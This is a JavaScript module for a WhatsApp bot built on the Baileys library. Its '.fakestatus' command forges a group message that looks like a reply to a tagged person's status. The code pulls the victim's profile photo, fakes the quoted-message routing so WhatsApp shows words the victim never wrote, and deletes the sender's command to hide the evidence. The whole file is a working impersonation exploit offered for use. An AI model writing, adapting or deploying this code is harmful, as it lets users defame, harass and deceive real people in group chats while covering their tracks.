import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

export default {
    name: 'estado_fantasma',
    match: (text) => /^\.fakestatus\s+/i.test(text),
    execute: async ({ sock, remitente, msg, textoLimpio }) => {
        
        const isGroup = remitente.endsWith('@g.us');
        if (!isGroup) return sock.sendMessage(remitente, { text: "❌ Ejecución denegada. Este exploit requiere la audiencia de un grupo." }, { quoted: msg });

        const mentionedJid = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedJid) return sock.sendMessage(remitente, { text: "❌ Faltan parámetros. Uso: .fakestatus @user texto del estado | tu respuesta" });

        const rawInput = textoLimpio.replace(/^\.fakestatus\s+/i, '').replace(/@\d+/g, '').trim();
        
        let textoEstado = "Odio mi vida...";
        let tuRespuesta = "¿Bro estás bien? 💀";

        const parts = rawInput.split('|').map(p => p.trim());
        if (parts.length > 0 && parts[0]) textoEstado = parts[0];
        if (parts.length > 1 && parts[1]) tuRespuesta = parts[1];

        try {
            // 1. Destrucción de la evidencia
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // 2. Extracción de la foto de perfil para darle realismo fotográfico al estado
            // Si la tiene oculta, usamos un píxel negro en base64 para que no crashee el renderizado
            let thumbBuffer = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==", "base64");
            try {
                const pfpUrl = await sock.profilePictureUrl(mentionedJid, 'image');
                if (pfpUrl) {
                    const res = await fetch(pfpUrl);
                    if (res.ok) thumbBuffer = Buffer.from(await res.arrayBuffer());
                }
            } catch (e) {
                // Fallback silencioso
            }

            // 3. Falsificación profunda del enrutamiento
            const waMsg = generateWAMessageFromContent(remitente, {
                extendedTextMessage: {
                    text: tuRespuesta,
                    contextInfo: {
                        participant: mentionedJid,
                        remoteJid: "status@broadcast", // EXPLOIT: Obliga a WhatsApp a dibujar la UI de "Respuesta a Estado"
                        stanzaId: "3EB0" + Date.now().toString(16).toUpperCase(), // ID fantasma
                        quotedMessage: {
                            imageMessage: {
                                jpegThumbnail: thumbBuffer, // Incrusta la foto robada en la miniatura
                                caption: textoEstado // El texto que supuestamente la víctima escribió en su estado
                            }
                        }
                    }
                }
            }, { userJid: sock.user.id });

            // 4. Inyección en el protocolo
            await sock.relayMessage(remitente, waMsg.message, { messageId: waMsg.key.id });

        } catch (err) {
            console.error("Error Fake Status:", err);
            await sock.sendMessage(remitente, { text: `❌ Falla crítica en la manipulación del enrutamiento: ${err.message}` });
        }
    }
};
